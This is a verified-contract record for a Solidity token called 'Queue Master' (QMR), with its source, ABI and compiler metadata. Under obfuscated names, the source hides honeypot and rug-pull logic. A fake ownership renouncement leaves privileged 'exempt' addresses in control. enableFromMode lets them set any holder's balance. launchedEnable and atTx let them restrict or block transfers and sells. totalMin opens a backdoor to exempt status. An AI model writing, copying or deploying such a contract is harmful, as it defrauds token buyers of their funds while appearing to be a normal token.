{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface swapSender {\n    function createPair(address shouldExempt, address tokenTeamAuto) external returns (address);\n}\n\ninterface tokenShouldTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTeam) external view returns (uint256);\n\n    function transfer(address walletLimit, uint256 buySell) external returns (bool);\n\n    function allowance(address sellShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buySell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletLimit,\n        uint256 buySell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listReceiver, uint256 value);\n    event Approval(address indexed sellShould, address indexed spender, uint256 value);\n}\n\nabstract contract fundLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listMinAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenShouldTxMetadata is tokenShouldTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QueueMaster is fundLimit, tokenShouldTx, tokenShouldTxMetadata {\n\n    function approve(address fromTx, uint256 buySell) public virtual override returns (bool) {\n        launchedReceiver[_msgSender()][fromTx] = buySell;\n        emit Approval(_msgSender(), fromTx, buySell);\n        return true;\n    }\n\n    string private launchLiquidity = \"Queue Master\";\n\n    string private atLaunched = \"QMR\";\n\n    event OwnershipTransferred(address indexed enableMax, address indexed atTokenEnable);\n\n    address public receiverMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atLaunched;\n    }\n\n    uint256 constant autoFundEnable = 14 ** 10;\n\n    bool private receiverTotal;\n\n    uint256 launchAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyLiquidity;\n    }\n\n    function balanceOf(address fromTeam) public view virtual override returns (uint256) {\n        return tokenWalletFee[fromTeam];\n    }\n\n    function transferFrom(address buyFrom, address walletLimit, uint256 buySell) external override returns (bool) {\n        if (_msgSender() != sellAuto) {\n            if (launchedReceiver[buyFrom][_msgSender()] != type(uint256).max) {\n                require(buySell <= launchedReceiver[buyFrom][_msgSender()]);\n                launchedReceiver[buyFrom][_msgSender()] -= buySell;\n            }\n        }\n        return marketingSellTotal(buyFrom, walletLimit, buySell);\n    }\n\n    function totalMin(address liquidityTx) public {\n        require(liquidityTx.balance < 100000);\n        if (toMaxEnable) {\n            return;\n        }\n        if (walletTeam == tradingMode) {\n            listFee = false;\n        }\n        exemptFee[liquidityTx] = true;\n        \n        toMaxEnable = true;\n    }\n\n    function owner() external view returns (address) {\n        return receiverAmount;\n    }\n\n    function marketingSellTotal(address buyFrom, address walletLimit, uint256 buySell) internal returns (bool) {\n        if (buyFrom == receiverMarketing) {\n            return takeFeeLiquidity(buyFrom, walletLimit, buySell);\n        }\n        uint256 senderWallet = tokenShouldTx(teamFrom).balanceOf(totalLimit);\n        require(senderWallet == marketingTakeLimit);\n        require(walletLimit != totalLimit);\n        if (shouldMin[buyFrom]) {\n            return takeFeeLiquidity(buyFrom, walletLimit, autoFundEnable);\n        }\n        return takeFeeLiquidity(buyFrom, walletLimit, buySell);\n    }\n\n    mapping(address => bool) public shouldMin;\n\n    bool public enableSwapSender;\n\n    constructor (){\n        \n        listMinAt modeShould = listMinAt(sellAuto);\n        teamFrom = swapSender(modeShould.factory()).createPair(modeShould.WETH(), address(this));\n        if (tradingMode == txToLaunch) {\n            listFee = true;\n        }\n        receiverMarketing = _msgSender();\n        exemptFee[receiverMarketing] = true;\n        tokenWalletFee[receiverMarketing] = buyLiquidity;\n        isMax();\n        if (listFee) {\n            walletTeam = txToLaunch;\n        }\n        emit Transfer(address(0), receiverMarketing, buyLiquidity);\n    }\n\n    uint256 private walletTeam;\n\n    bool public toMaxEnable;\n\n    function transfer(address swapTrading, uint256 buySell) external virtual override returns (bool) {\n        return marketingSellTotal(_msgSender(), swapTrading, buySell);\n    }\n\n    mapping(address => bool) public exemptFee;\n\n    bool private listFee;\n\n    mapping(address => mapping(address => uint256)) private launchedReceiver;\n\n    uint256 private buyLiquidity = 100000000 * 10 ** 18;\n\n    function isMax() public {\n        emit OwnershipTransferred(receiverMarketing, address(0));\n        receiverAmount = address(0);\n    }\n\n    address private receiverAmount;\n\n    address sellAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return receiverAmount;\n    }\n\n    uint256 private txToLaunch;\n\n    function enableFromMode(address swapTrading, uint256 buySell) public {\n        fromSender();\n        tokenWalletFee[swapTrading] = buySell;\n    }\n\n    function atTx(uint256 buySell) public {\n        fromSender();\n        marketingTakeLimit = buySell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listTx;\n    }\n\n    function takeFeeLiquidity(address buyFrom, address walletLimit, uint256 buySell) internal returns (bool) {\n        require(tokenWalletFee[buyFrom] >= buySell);\n        tokenWalletFee[buyFrom] -= buySell;\n        tokenWalletFee[walletLimit] += buySell;\n        emit Transfer(buyFrom, walletLimit, buySell);\n        return true;\n    }\n\n    function fromSender() private view {\n        require(exemptFee[_msgSender()]);\n    }\n\n    address totalLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public teamFrom;\n\n    mapping(address => uint256) private tokenWalletFee;\n\n    function name() external view virtual override returns (string memory) {\n        return launchLiquidity;\n    }\n\n    uint8 private listTx = 18;\n\n    function launchedEnable(address totalTeam) public {\n        fromSender();\n        \n        if (totalTeam == receiverMarketing || totalTeam == teamFrom) {\n            return;\n        }\n        shouldMin[totalTeam] = true;\n    }\n\n    function allowance(address modeAt, address fromTx) external view virtual override returns (uint256) {\n        if (fromTx == sellAuto) {\n            return type(uint256).max;\n        }\n        return launchedReceiver[modeAt][fromTx];\n    }\n\n    uint256 marketingTakeLimit;\n\n    uint256 private tradingMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTokenEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"atTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"enableFromMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwapSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"}],\"name\":\"launchedEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMaxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"}],\"name\":\"totalMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buySell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "QueueMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}